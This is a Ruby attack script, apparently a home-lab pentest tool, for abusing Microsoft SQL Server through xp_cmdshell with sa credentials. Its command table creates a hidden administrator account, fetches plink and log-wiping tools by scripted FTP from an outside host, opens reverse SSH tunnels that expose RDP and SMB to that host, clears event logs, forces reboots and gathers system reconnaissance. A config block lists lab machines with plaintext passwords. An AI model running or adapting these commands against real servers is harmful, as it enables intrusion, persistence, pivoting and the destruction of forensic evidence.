require 'tiny_tds'


# v1.0 - original
# 24.9.2014
# Author: scribl

class XpCmdShell


  def initialize (arg)


    #shh
    @ssh_user = arg[:ssh][:ssh_user]
    @ssh_pass = arg[:ssh][:ssh_pass]
    @ssh_ip   = arg[:ssh][:ip]
    @ssh_port = arg[:ssh][:ssh_port]

    #ftp
    @ftp_user = arg[:ftp][:ftp_user]
    @ftp_pass = arg[:ftp][:ftp_pass]
    @ftp_ip = arg[:ftp][:ip]
    @ftp_port = arg[:ftp][:ftp_port]

    #sql
    @mssql_user = arg[:mssql][:mssql_user]
    @mssql_pass = arg[:mssql][:mssql_pass]
    @mssql_ip   = arg[:mssql][:ip]
    @mssql_port = arg[:mssql][:mssql_port]

    #plink
    @target_ip = arg[:target][:ip]

    #windows user
    @win_pass = arg[:creds][:hx_pass]
    @win_user = arg[:creds][:hx_user]

=begin
# test start
    puts "[+] ssh user: #{@ssh_user}"
    puts "[+] ssh pass: #{@ssh_pass}"
    puts "[+] ssh ip: #{@ssh_ip}"
    puts "[+] ssh port: #{@ssh_port}"
    puts "[+] ftp user #{@ftp_user} "
    puts "[+] ftp ip #{@ftp_ip}"
    puts "[+] ftp pass #{@ftp_pass}"
    puts "[+] ftp port #{@ftp_port}"

    puts "[+] sql user: #{@mssql_user}"
    puts "[+] sql pass: #{@mssql_pass}"
    puts "[+] sql port: #{@mssql_port}"
    puts "[+] sql ip: #{@mssql_ip}"

    puts "[+] target ip: #{@target_ip}"
    puts "[+] windows password: #{@win_pass}"
    puts "[+] windows user: #{@win_user}"
    puts " "

# =test end
=end

    @cmd = {
        :makeCmdShellActive => [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        ],
        :makeCmdShellInactive => [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
        ],
        :createWin => [
            "EXEC xp_cmdshell 'net user /add #{@win_user} #{@win_pass}'",
            "EXEC xp_cmdshell 'net localgroup administrators #{@win_user} /add'"
        ],
        :makeUserActive =>[
            "EXEC xp_cmdshell 'NET USER #{@win_user} /DOMAIN /ACTIVE:YES'"],
        :makeUserInActive =>[
            "EXEC xp_cmdshell 'NET USER #{@win_user} /DOMAIN /ACTIVE:NO'"],
        :delWinUser => [
            "EXEC xp_cmdshell 'net user #{@win_user} /del'"],
        :tree => [
            "EXEC xp_cmdshell 'tree c:\\'"],
        :ftpGetPlink => [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get plink.exe plink.exe.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren plink.exe.txt plink.exe'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :ftpGetClearEv=> [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get clearev.vbs clearev.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo get cleanafterme.exe cleanafterme.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren clearev.txt clearev.vbs'",
            "EXEC xp_cmdshell 'ren cleanafterme.txt cleanafterme.exe'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :ftpGetClearSSH => [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get clearSSH.vbs clearSSH.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren clearSSH.txt clearSSH.vbs'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :forward_3389_to_3388 =>[
            "EXEC xp_cmdshell'Echo N > ssh.txt'",
            "EXEC xp_cmdshell 'plink.exe  -N -l #{@ssh_user} -pw #{@ssh_pass} -P #{@ssh_port} -R 3388:#{@target_ip}:3389 #{@ssh_ip}< ssh.txt'",
            "EXEC xp_cmdshell 'del ssh.txt'",
        ],

        :forward_445_From_445 =>[
            "EXEC xp_cmdshell'Echo N > ssh.txt'",
            "EXEC xp_cmdshell 'plink.exe  -N -l #{@ssh_user} -pw #{@ssh_pass} -P #{@ssh_port} -R 445:#{@target_ip}:445 #{@ssh_ip}< ssh.txt'",
            "EXEC xp_cmdshell 'del ssh.txt'"
        ],
        :doClearEv => [
            "EXEC xp_cmdshell 'cscript clearev.vbs'",
        ],
        :doWinRestart => [
            "EXEC xp_cmdshell 'shutdown -r -f -t 2'", # force restart in 2 seconds
            "EXEC xp_cmdshell 'cscript clearev.vbs'"
        ],
        :tasklist => [ #show all running processes
            "EXEC xp_cmdshell 'tasklist'"
        ],
        :taskkill => [
            "EXEC xp_cmdshell 'taskkill /pid 576 /f'" #change the pid when you have run tasklist
        ],
        :ipconfig => [
            "EXEC xp_cmdshell 'ipconfig'"
        ],

        :arp => [
            "EXEC xp_cmdshell 'tasklist'"
        ],

        :dir =>[
            "EXEC xp_cmdshell 'dir C:\\'"
        ],

        :net_users =>[
            "EXEC xp_cmdshell 'net users'"
        ],

        :net_start =>[
            "EXEC xp_cmdshell 'net start'"
        ],

        :net_use =>[
            "EXEC xp_cmdshell 'net use'"
        ],

        :netstat =>[
            "EXEC xp_cmdshell 'netstat -ano'"
        ],

        :tasklist =>[
            "EXEC xp_cmdshell 'tasklist'"
        ],

        :arp =>[
            "EXEC xp_cmdshell 'arp -a'"
        ],
        :ipconfig =>[
            "EXEC xp_cmdshell 'ipconfig /all'"
        ],


        :scrape => [
            "EXEC xp_cmdshell 'net users'",
            "EXEC xp_cmdshell 'net start'",
            "EXEC xp_cmdshell 'net use'",
            "EXEC xp_cmdshell 'netstat -ano '",
            "EXEC xp_cmdshell 'tasklist'",
            "EXEC xp_cmdshell 'arp -a'",
            "EXEC xp_cmdshell 'ipconfig /all'",
            "EXEC xp_cmdshell 'set'",
            "EXEC xp_cmdshell 'systeminfo'",
        ],
    }
  end

  def doCmd(cmdArr)
    begin
      client = TinyTds::Client.new(:username => @mssql_user, :password => @mssql_pass, :host => @mssql_ip, :port => @mssql_port)

      cmdArr.each do |key|
        lineArr = @cmd[key]
        lineArr.each do |line|
          result = client.execute(line)
          result.each do |row|
            puts row.to_s[12..-3]
          end
        end
        puts ""
      end
    rescue Exception => e
      puts "[-] " + e.message
      exit
      # puts e.backtrace.inspect
    end
    client.close

  end #def

end # Class




config = {

    :lab0 => {
        :role => 'PENTEST',
        :name => 'debian',
        :ip => '192.168.1.23',
        :os => 'Linux',
        :flavour => 'Debian',
        :root => 'LUNCH701',
        :admin => 'Administrator',
        :admin_pass => 'lunch701',
        :ftp_user => 'user',
        :ftp_pass => 'user_pass',
        :ftp_port => '21',
        :ssh_user => 'user',
        :ssh_pass => 'user_pass',
        :ssh_port => '22',
    },


    :lab1 => {
          :role => 'PENTEST',
          :name => 'LAB-1',
          :ip =>'192.168.1.112',
          :os => 'XP',
          :flavour => 'PRO,SP3',
          :admin => 'Administrator',
          :admin_pass => '!dowN09',
          :ftp_user =>'ftp_user',
          :ftp_pass => 'ftp_pass',
          :ftp_port => '21',
          :ssh_user => 'ssh_account',
          :ssh_pass => 'ssh_pass',
          :ssh_port => '22',
      },

      :lab2 => {
          :role => 'PIVOT',
          :name => 'Lab-2',
          :ip => '192.168.1.31',
          :os => 'XP',
          :flavour => 'PRO,SP3',
          :admin => 'Administrator',
          :admin_pass => 'LUNCH701',
          :user => 'user',
          :user_pass => 'user_pass',
          :mssql_user => 'sa',
          :mssql_pass => 'SYSADM',
          :mssql_port => '1035',
      },


      :lab3 => {
          :role => 'PIVOT',
          :name => 'LAB3',
          :ip => '192.168.1.241',
          :os => 'WIN 7',
          :flavour => 'PRO, SP1',
          :admin => 'Administrator',
          :admin_pass => 'WINXP_PRO701',
          :mssql_user => 'sa',
          :mssql_pass => 'SYSADM',
          :mssql_port => '1214',
      },



      :lab4 => {
          :role => 'PIVOT',
          :name => 'LAB4-MSSQL',
          :ip => '192.168.1.214',
          :os => 'XP',
          :flavour => 'PRO, SP3',
          :admin => 'Administrator',
          :admin_pass => 'LUNCH701',
          :mssql_user => 'sa',
          :mssql_pass => 'SYSADM',
          :mssql_port => '1214',
      },


      :lab5 => {
          :name => 'debian',
          :role => 'SSH SERVER / FTP SERVER',
          :ip => '192.168.1.200',
          :os => 'Linux',
          :flavour => 'Debian',
          :root => 'LUNCH701',
          :admin => 'Administrator',
          :admin_pass => 'lunch701',
          :ftp_user => 'user',
          :ftp_pass => 'user_pass',
          :ftp_port => '21',
          :ssh_user => 'user',
          :ssh_pass => 'user_pass',
          :ssh_port => '22',
      },

      :lab6 => {
          :alias => 'LAB6',
          :name => 'Retina',
          :role => 'HOST',
          :ip => '192.168.1.9',
          :os => 'OSX',
          :flavour => 'Mavericks',
          :root => 'LUNC701',
          :admin => 'Macbook',
          :admin_pass => 'lunch09',

      },

      :lab7 => {
          :alias => 'LAB7',
          :name => 'FLORENCE',
          :role => 'HOST',
          :ip => '192.168.1.151',
          :os => 'OSX',
          :flavour => 'Mavericks',
          :root => 'LUNCH701',
          :admin => 'Stephan',
          :admin_pass => 'LUNCH701',
      },


    :creds_1 => {
        :hx_user => 'hx0r',
        :hx_pass => 'pass',

    },


} #config




xp = XpCmdShell.new ({
                      :ssh => config[:lab0],
                      :ftp => config[:lab0],
                      :mssql => config[:lab4],
                      :target => config[:lab2],
                      :creds => config[:creds_1],
      })


xp.doCmd ([:ipconfig])

